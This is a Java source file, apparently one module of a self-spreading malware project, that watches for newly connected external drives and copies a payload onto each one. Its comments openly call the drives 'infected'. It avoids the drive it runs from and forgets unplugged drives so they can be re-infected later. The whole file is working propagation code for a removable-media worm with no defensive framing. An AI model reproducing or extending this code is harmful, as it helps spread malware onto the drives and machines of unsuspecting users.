package modules.core;

import java.io.File;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.random.RandomGenerator;

import modules.auxiliary.Module;
import modules.auxiliary.ModuleConfig.CopyConfig;
import modules.file.MediaWriterFileHandler;

/**
    Singleton module to duplicate payload across external storage media using Copy module.

    @author Str1k3r
    @version 1.0
    @see Copy
*/
public class MediaWriter implements Module, Runnable {
    
    private static MediaWriter instance;
    private CopyConfig copyConfig;
    private LinkedList<File> historicalVolumes;
    private static ExecutorService threadPool;
    private static boolean isStopped = false;

    /**
        Construtor to initialise contained copy module configuration. 
        @param copyModule Copy module configuration to use.
    */
    private MediaWriter(CopyConfig copyModule) {
        this.copyConfig = copyModule;
        this.historicalVolumes = new LinkedList<>();

        threadPool = Executors.newFixedThreadPool(3); // at most 3 storage devices handled at a time
    }

    /**
        Instantiate or re-instantiate the class thread pool if not instantiated or is shutdown.
     */
    private void initThreadPool() {
        if(threadPool == null || threadPool.isShutdown()) {
            threadPool = Executors.newFixedThreadPool(3);
        }
    }

    /**
        Returns the instance the MediaWriter.
        @param copyConfig Copy module configuration to use.
        @return MediaWriter module instance
    */
    public static MediaWriter getInstance(CopyConfig copyConfig) {
        if(instance == null) {
            instance = new MediaWriter(copyConfig);
        }

        isStopped = false;
        return instance;
    }

    /**
        Returns the running state of the MediaWriter.

        @return Returns true if the MediaWriter instance has been created, returns false if it was shutdown.
     */
    public static boolean isStopped() {
        return isStopped;
    }

    /**
        Repeatedly listens for connection of external storage media, for duplication of 
        payload onto.
    */
    public void listen() {
        System.out.println("[*] Monitoring media storage connections ...");
        initThreadPool();
        
        // get list of current connected volumes (roots)
        File[] currentVolumes = File.listRoots();
        while (true) {
            if(isStopped()) break;

            try {
                // discontinue attempts
                for (File currentVol : currentVolumes) {
                    if(isStopped()) break;


                    if (!isNewVolume(currentVol)) {
                        continue; // not new volume, so skip
                    }

                    // new volumes are infected and logged
                    // same configuration, different volume
                    CopyConfig currentConfig = copyConfig;
                    currentConfig.startPath = currentVol.getAbsolutePath();
                    Copy currentCopy = new Copy(currentConfig); // every volume needs different copy module instance

                    if(!isStopped()) {
                        threadPool.execute(currentCopy); // will perform duplication in new thread on the current volume
                        System.out.printf("Drive %s %s Bytes (Code: %d)\n", currentVol.getAbsolutePath(), currentVol.getTotalSpace(),
                                currentVol.hashCode());
                        historicalVolumes.addLast(currentVol); // record in history of encountered (ie. infected) volumes.

                    }
                    else {
                        break;
                    }

                }
            }
            catch(Exception ex) { /*pass*/ }
            
            // refresh list of current (connected) volumes - allow discovery of new ones
            currentVolumes = File.listRoots();
            clearRemovedVolumes(currentVolumes);
        }

    }

    /**
        Threaded execution function.
    */
    @Override
    public void run() {
        listen();
    }

    /**
        Clear historical volumes that have been unplugged from the device, so they can be infected
        when plugged in again. These are volumes that are not in the list of current connected volumes.

        @param currentVolumes The list of current connected volumes.
     */
    private  void clearRemovedVolumes(File[] currentVolumes) {
        for(File historical : historicalVolumes) {
            boolean isUnplugged = true; // presume unplugged

            for (File current : currentVolumes) {
                if (current.hashCode() == historical.hashCode()) {
                    isUnplugged = false; // found a match, no need to clear
                }
            }

            if (isUnplugged) {
                historicalVolumes.remove(historical); // not plugged in, remove
            }
        }
    }

    /**
        Lookup a provided volume (by hashCode) from the set of already logged volumes.

        @param volume The volume to look up.
        @return Returns true if volumes corresponding hash is logged already, false otherwise 
    */
    private boolean isNewVolume(File volume) {
    	
    	// if current working dir's path starts with the volume path - the volume is the
    	// root of the current working dir
    	if((new File(".")).getAbsolutePath().startsWith(
    			volume.getAbsolutePath())) {
    		return false; // don't infect this volume - it's where the program runs from
    	}

        return isNotRecentInfected(volume);
    }

    /**
        Determine if a given volume was infected in the current instance of
        the MediaWriter.
     */
    private boolean isNotRecentInfected(File volume) {
        for(File historicalVol : historicalVolumes) {
            if(historicalVol.hashCode() == volume.hashCode()) {
                return false; // exists, the is not new
            }
        }
        return true; // new
    }

    /**
     Shuts down thread pool for current instance.
     */
    public static void shutdown() {
        threadPool.shutdown(); // revoke new task creation
        try {
            // wait for existing threads to terminate before force terminate
            if(!threadPool.awaitTermination(20, TimeUnit.SECONDS)) {
                threadPool.shutdownNow();
            }
        }
        catch(InterruptedException interruptEx) {
            // waiting for threads to terminate interrupted
            // force termination
            threadPool.shutdownNow();
            Thread.currentThread().interrupt(); // maintain interrupt status
        }

        isStopped = true;
    }
}
